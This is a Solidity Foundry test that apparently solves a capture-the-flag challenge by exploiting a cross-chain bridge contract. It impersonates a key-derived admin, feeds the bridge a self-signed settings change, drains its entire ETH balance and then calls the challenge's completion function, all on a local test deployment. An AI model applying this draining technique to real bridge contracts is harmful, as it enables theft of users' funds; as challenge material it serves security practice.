pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/Challenge.sol";
import "src/AdminNFT.sol";
import "src/Bridge.sol";
import "src/openzeppelin-contracts/utils/cryptography/ECDSA.sol";

contract Solve is Test {
    function test_solve() public {
        Challenge challenge = new Challenge{value: 1_000 ether}(address(this));
        Bridge bridge = challenge.BRIDGE();
        AdminNFT anft = challenge.ADMIN_NFT();

        uint pk = 1337;
        address pka = vm.addr(pk);

        console.log(challenge.isSolved());

        vm.prank(pka);
        anft.setApprovalForAll(address(this), true);
        anft.safeBatchTransferFrom(address(pka), address(bridge), new uint[](200), new uint[](200), "");
        
        bytes memory message = abi.encode(address(challenge), address(anft), uint256(1 << 96));
        bytes[] memory sigs = new bytes[](1);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ECDSA.toEthSignedMessageHash(message));
        sigs[0] = abi.encodePacked(r, s, v);
        vm.prank(pka);
        bridge.changeBridgeSettings(message, sigs);
        vm.prank(pka);
        bridge.withdrawEth(keccak256("1"), new bytes[](0), address(this), address(bridge).balance, "");
        vm.prank(pka);
        bridge.withdrawEth(keccak256("2"), new bytes[](0), address(challenge), 1, abi.encodeWithSignature("completeChallenge(address)", address(this)));

        console.log(challenge.isSolved());
    }

    receive() external payable {}
}